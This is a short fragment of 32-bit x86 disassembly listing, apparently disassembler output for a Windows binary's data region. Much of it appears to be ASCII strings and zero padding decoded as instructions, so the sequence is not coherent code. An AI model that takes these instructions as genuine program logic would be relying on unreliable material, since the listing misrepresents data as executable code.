  420fdd:	jb     0x421051
  420fdf:	outs   dx,BYTE PTR gs:[esi]
  420fe1:	je     0x421027
  420fe3:	popa   
  420fe4:	je     0x421047
  420fe6:	pop    esp
  420fe7:	dec    ebp
  420fe8:	outs   dx,DWORD PTR ds:[esi]
  420fe9:	imul   esp,DWORD PTR fs:[esi+0x79],0x7070415c
  420ff1:	ins    BYTE PTR es:[edi],dx
  420ff2:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  420ff9:	dec    esi
  420ffa:	gs ja  0x420ffd
  420ffd:	add    BYTE PTR [eax],al
  420fff:	add    BYTE PTR [eax],al
  421001:	add    BYTE PTR [eax],al
  421003:	add    BYTE PTR [edx-0x2c],cl
  421006:	mov    bl,0x4d
  421008:	add    BYTE PTR [eax],al
  42100a:	add    BYTE PTR [eax],al
  42100c:	xor    dl,BYTE PTR [eax]
  42100e:	add    al,BYTE PTR [eax]
  421010:	add    DWORD PTR [eax],eax
  421012:	add    BYTE PTR [eax],al
  421014:	add    DWORD PTR [eax],eax
  421016:	add    BYTE PTR [eax],al
  421018:	add    DWORD PTR [eax],eax
  42101a:	add    BYTE PTR [eax],al
  42101c:	sub    BYTE PTR [eax],dl
  42101e:	add    al,BYTE PTR [eax]
  421020:	sub    al,0x10
  421022:	add    al,BYTE PTR [eax]
  421024:	xor    BYTE PTR [eax],dl
  421026:	add    al,BYTE PTR [eax]
  421028:	mov    edi,0x3e000020
  42102d:	adc    BYTE PTR [edx],al
  42102f:	add    BYTE PTR [eax],al
  421031:	add    BYTE PTR [ebx+0x79],dl
  421034:	ins    DWORD PTR es:[edi],dx
  421035:	bound  ebp,QWORD PTR [edi+0x6c]
  421038:	imul   esp,DWORD PTR [ebx+0x45],0x3f006578
  42103f:	inc    ebx
  421040:	ins    BYTE PTR es:[edi],dx
  421041:	outs   dx,DWORD PTR ds:[esi]
  421042:	jae    0x4210a9
  421044:	push   edi
  421045:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  42104c:	popa   
  42104d:	je     0x4210b8
  42104f:	outs   dx,DWORD PTR ds:[esi]
  421050:	outs   dx,BYTE PTR ds:[esi]
  421051:	inc    ebx
  421052:	ins    BYTE PTR es:[edi],dx
  421053:	outs   dx,DWORD PTR ds:[esi]
  421054:	jae    0x4210bb
  421056:	push   edi
  421057:	.byte 0x69
